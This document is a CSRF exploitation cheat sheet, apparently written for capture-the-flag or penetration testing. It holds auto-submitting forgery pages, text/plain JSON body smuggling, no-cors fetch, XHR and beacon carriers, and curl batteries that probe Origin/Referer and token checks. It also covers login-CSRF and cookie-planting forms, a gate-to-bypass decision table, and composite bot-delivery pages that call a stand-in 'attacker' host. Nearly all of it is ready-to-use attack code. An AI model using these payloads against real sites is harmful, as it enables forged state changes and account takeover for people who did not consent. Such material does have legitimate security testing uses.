# Extended corpus — the deep payload and case library

The full working set: every delivery page shape, body assembly,
header probe, framework-specific form, and edge case, organized for
lookup during exploitation.

---

## A. Delivery pages — every auto-firing shape

### A1. The minimal auto-submit
```html
<form id=f action="https://t/x" method=POST><input name=a value=1></form>
<script>f.submit()</script>
```

### A2. The hidden-iframe target — stays on page
```html
<iframe name=w style=display:none></iframe>
<form target=w action="https://t/x" method=POST><input name=a value=1></form>
<script>document.forms[0].submit()</script>
```

### A3. The referer-stripped page
```html
<meta name=referrer content=no-referrer>
<form action="https://t/x" method=POST><input name=a value=1></form>
<script>document.forms[0].submit()</script>
```

### A4. The data: URL — no external host
```
data:text/html,<form action="https://t/x" method=POST><input name=a value=1></form><script>document.forms[0].submit()</script>
```
URL-encode when the submit endpoint validates:
```
data:text/html,%3Cform%20action%3D%22https%3A%2F%2Ft%2Fx%22%20method%3DPOST%3E...
```

### A5. The multi-form chain
```html
<iframe name=w1 style=display:none></iframe><iframe name=w2 style=display:none></iframe>
<form target=w1 action="https://t/a" method=POST><input name=x value=1></form>
<form target=w2 action="https://t/b" method=POST><input name=y value=2></form>
<script>for(f of document.forms)f.submit()</script>
```

### A6. The onload/onerror auto-fire — no explicit submit
```html
<body onload="document.forms[0].submit()">
<form action="https://t/x" method=POST><input name=a value=1></form>
```
```html
<img src=x onerror="document.forms[0].submit()">
<form action="https://t/x" method=POST><input name=a value=1></form>
```

### A7. The GET top-nav — SameSite=Lax
```html
<script>location='https://t/transfer?to=me&a=1'</script>
```
```html
<meta http-equiv=refresh content="0;url=https://t/x?a=1">
```
```html
<script>window.open('https://t/x?a=1')</script>
```

### A8. The form inside a comment/markdown — a stored shape
```html
<!-- a markdown that renders HTML -->
[click](javascript:document.forms[0].submit())
<form action="/x" method=POST><input name=a value=1></form>
```

## B. JSON-body assemblies — the complete =-absorption set

### B1. Single-field, = inside the value
```html
<input name='{"name":"' value='x"}'>
<!-- {"name":"=x"} -->
```

### B2. = inside a real string field — no dummy
```html
<input name='{"user":"admin","pass":"x' value='=y"}'>
<!-- {"user":"admin","pass":"x=y"} -->
```
```html
<input name='{"q":"' value='=term","page":1}'>
<!-- {"q":"=term","page":1} -->
```

### B3. Dummy keys carry the =s
```html
<input name='{"a":"1","i":"' value='","b":"2"}'>
<!-- {"a":"1","i":"=","b":"2"} -->
```

### B4. Multi-input — split at token boundaries
```html
<input name='{"a":"1","i":"' value='","b":"2","j":"'>
<input name='","k":"' value='","c":"3"}'>
<!-- {"a":"1","i":"=","b":"2","j":"\r\n=","k":"=","c":"3"} -->
```

### B5. Numeric/bool fields — = inside a string sibling
```html
<input name='{"page":1,"s":"' value='","admin":true}'>
<!-- {"page":1,"s":"=","admin":true} -->
```
```html
<input name='{"n":42,"t":"' value='","flag":false}'>
<!-- {"n":42,"t":"=","flag":false} -->
```

### B6. Nested objects
```html
<input name='{"cfg":{"role":"' value='=admin"}}'>
<!-- {"cfg":{"role":"=admin"}} -->
```
```html
<input name='{"a":{"b":{"c":"' value='=x"}}}'>
<!-- {"a":{"b":{"c":"=x"}}} -->
```

### B7. Arrays
```html
<input name='{"tags":["' value='=x"],"i":""}'>
<!-- {"tags":["=x"],"i":""} -->
```
```html
<input name='{"ids":[1,2,3],"s":"' value='"}'>
<!-- {"ids":[1,2,3],"s":"="} -->
```

### B8. A marker + a real write together
```html
<input name='{"machine_id":"host-1","tag":"csrf-9f","i":"' value='"}'>
<!-- {"machine_id":"host-1","tag":"csrf-9f","i":"="} -->
```

## C. The fetch/xhr/beacon bodies — JS carriers

### C1. fetch no-cors — the text/plain JSON
```js
fetch('https://t/x',{method:'POST',mode:'no-cors',credentials:'include',
  headers:{'Content-Type':'text/plain'},body:'{"a":1,"i":"="}'})
```

### C2. fetch no-cors — urlencoded
```js
fetch('https://t/x',{method:'POST',mode:'no-cors',credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'a=1&b=2'})
```

### C3. fetch no-cors — a Blob for a custom type
```js
fetch('https://t/x',{method:'POST',mode:'no-cors',credentials:'include',
  body:new Blob(['{"a":1}'],{type:'text/plain'})})
```

### C4. xhr
```js
var x=new XMLHttpRequest();x.open('POST','https://t/x',true);
x.withCredentials=true;x.setRequestHeader('Content-Type','text/plain');
x.send('{"a":1,"i":"="}');
```

### C5. sendBeacon
```js
navigator.sendBeacon('https://t/x',new Blob(['{"a":1,"i":"="}'],{type:'text/plain'}))
navigator.sendBeacon('https://t/x','a=1')
navigator.sendBeacon('https://t/x',new URLSearchParams('a=1'))
navigator.sendBeacon('https://t/x',new FormData(f))
```

### C6. EventSource — GET stream
```js
new EventSource('https://t/stream?to=me&a=1')
```

### C7. WebSocket
```js
var ws=new WebSocket('wss://t/ws');
ws.onopen=()=>ws.send(JSON.stringify({op:'write',data:{a:1}}))
```

## D. Sub-resource GET carriers — the full tag set

```html
<img src="https://t/x?a=1">
<script src="https://t/x?a=1"></script>
<link rel=stylesheet href="https://t/x?a=1">
<iframe src="https://t/x?a=1"></iframe>
<video src="https://t/x?a=1"></video>
<audio src="https://t/x?a=1"></audio>
<embed src="https://t/x?a=1">
<object data="https://t/x?a=1"></object>
<input type=image src="https://t/x?a=1">
<body background="https://t/x?a=1">
<table background="https://t/x?a=1">
<td background="https://t/x?a=1">
<svg><image href="https://t/x?a=1"/></svg>
<video><track src="https://t/x?a=1"></video>
<iframe srcdoc="<img src='https://t/x?a=1'>"></iframe>
<blockquote cite="https://t/x?a=1">
<q cite="https://t/x?a=1">
<del cite="https://t/x?a=1">
<form action="https://t/x?a=1"><input type=submit></form>
<isindex action="https://t/x?a=1">
<base href="https://t/x?a=1">
```

## E. Method-override and GET-write shapes

```text
GET /x?a=1&_method=POST
GET /x?a=1&_method=PUT
GET /x?a=1&_method=DELETE
GET /x?a=1&method=delete
GET /x?a=1&action=delete
X-HTTP-Method-Override can't ship cross-origin — a query-param hint can
```

## F. The header-probe set — Origin/Referer

```bash
# the battery
for h in 'Origin: https://evil.com' 'Origin:' 'Origin: null' \
         'Referer: https://evil.com/' 'Referer:' \
         'Referer: https://t.evil.com' 'Referer: https://evil/t.com' \
         'Referer: https://evil-t.com' 'Referer: https://t.com@evil.com' \
         'Referer: https://evil.com?t.com' 'Referer: null'; do
  curl -s -o /dev/null -w '%{http_code} ' -X POST "$BASE/x" -d 'a=1' \
    -H "$h" -b "$CJ"; echo "[$h]"; done
```

## G. The token-probe set

```bash
# strip, empty, literal, coercible, replay
curl -X POST "$BASE/x" -d 'a=1' -b "$CJ"                  # strip
curl -X POST "$BASE/x" -d 'a=1&csrf=' -b "$CJ"          # empty
for t in null undefined 0 false ' ' '{}' '[]'; do
  curl -X POST "$BASE/x" -d "a=1&csrf=$t" -b "$CJ"; done
# replay yours under a different session
curl -X POST "$BASE/x" -d "a=1&csrf=$MYTOKEN" -b "$OTHER_CJ"
```

## H. The cookie-attribute audit

```bash
curl -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
curl -i -X POST "$BASE/login" -d 'u=x&p=y' | grep -i 'set-cookie'
# read: SameSite=Strict|Lax|None(+Secure)|missing; Secure; HttpOnly
```

## I. The content-type probe set

```bash
for ct in 'text/plain' 'application/x-www-form-urlencoded' \
          'multipart/form-data' 'application/json' 'text/html'; do
  curl -X POST "$BASE/x" -H "Content-Type: $ct" \
    --data '{"a":1,"i":"="}' -b "$CJ" -o /dev/null -w '%{http_code} '
  echo "[$ct]"; done
```

## J. The login-CSRF set

```html
<!-- urlencoded login -->
<form action="https://t/login" method=POST>
<input name=username value=me><input name=password value=x></form>
<script>document.forms[0].submit()</script>

<!-- JSON login via text/plain -->
<form action="https://t/login" method=POST enctype=text/plain>
<input name='{"user":"me","pass":"x","i":"' value='"}'></form>
<script>document.forms[0].submit()</script>

<!-- SSO login — the SSOS shape -->
<form action="https://sso/login" method=POST enctype=text/plain>
<input name='{"u":"me","p":"x","i":"' value='"}'></form>
```

## K. The cookie-plant set

```html
<!-- a subdomain cookie-set primes double-submit -->
<img src="https://sub.t/set-cookie?csrf=x">
<form action="https://t/x" method=POST><input name=csrf value=x></form>

<!-- a header-injection cookie-set -->
<img src="https://t/reflect?in=Set-Cookie:%20csrf=x">
```

## L. The composite bot-delivery pages

```html
<!-- the TornadoService shape -->
<!doctype html><meta name=referrer content=no-referrer>
<form id=f action="http://127.0.0.1:1337/update" method=POST enctype=text/plain>
<input name='{"machine_id":"host-x","ignore":"' value='"}'></form>
<script>f.submit();fetch('https://attacker/hit?d=1',{mode:'no-cors'})</script>

<!-- the SSOS shape -->
<!doctype html><form action="https://sso/login" method=POST enctype=text/plain>
<input name='{"u":"me","p":"x","i":"' value='"}'></form>
<script>document.forms[0].submit()</script>
```

## M. Edge cases — the corner payloads

### M1. A PUT/DELETE via method-override
```html
<form action="https://t/x?_method=PUT" method=POST><input name=a value=1></form>
```

### M2. A GET-form with a hidden write
```html
<form action="https://t/search" method=GET>
<input name=q value=x><input type=hidden name=delete value=1></form>
```

### M3. A form whose action is a relative path — base-tag shift
```html
<base href="https://t/"><form action="x" method=POST><input name=a value=1></form>
```

### M4. The enctype=text/plain on a GET — ignored (GET has no body)
```html
<form action="https://t/x?a=1" method=GET><input type=submit></form>
```

### M5. A form targeting _blank — a new-tab write
```html
<form target=_blank action="https://t/x" method=POST><input name=a value=1></form>
```

### M6. An iframe that self-submits — the nested shape
```html
<iframe srcdoc='<form action="https://t/x" method=POST><input name=a value=1></form><script>document.forms[0].submit()<\/script>'></iframe>
```

### M7. A multipart file-field carrying JSON
```html
<form action="https://t/x" method=POST enctype=multipart/form-data>
<input type=file name=f><input name=cfg value='{"a":1}'></form>
```

### M8. The charset-trick — a legacy encoding form
```html
<form action="https://t/x" method=POST accept-charset="ISO-8859-1">
<input name=a value=1></form>
```

### M9. A form inside an SVG/foreign context
```html
<svg><foreignObject><form action="https://t/x" method=POST>
<input name=a value=1></form></foreignObject></svg>
```

### M10. The window.name channel — NOT a CSRF carrier
```js
window.name=JSON.stringify({a:1})   // no request — a channel only
```

## N. The decision table — gate → carrier

| Gate state | The surviving carrier |
|---|---|
| SameSite=Strict | none — dead for this cookie |
| SameSite=Lax + GET write | form GET / a/meta/location/window.open |
| SameSite=Lax + POST write only | dead via cookie; a non-cookie credential? |
| SameSite=None+Secure | every carrier |
| missing SameSite + old bot | every carrier |
| missing SameSite + modern | GET-nav only |
| token session-bound | dead unless broken (replay/empty/double-submit) |
| Origin/Referer enforced | absent-referer or substring-host bypass |
| json-only + strict | dead via form; a lenient sibling |
| no stored-content + all gates | dead — pivot class |

## O. The grep-corpus — finding the CSRF posture

```bash
# state-changing endpoints
grep -rnoE '(POST|PUT|PATCH|DELETE|route|@app|app\.|router\.)[^"]*(change|update|transfer|delete|create|set|add|edit|assign|register|login|password|email|role|admin|grant)' <src> | head -40

# the CSRF-defense vocabulary
grep -rnoiE 'csrf|xsrf|_token|authenticity|forgery|SameSite|samesite|origin|referer|content-type' <src> | head -60

# the bot surface
grep -rnoE 'puppeteer|playwright|selenium|headless|chromedriver|report|visit|admin-bot' <src> | head -20

# the localhost/internal gate
grep -rnoE '127\.0\.0\.1|localhost|remote_ip|RemoteAddr|ClientIP|private|internal' <src> | head -20
```
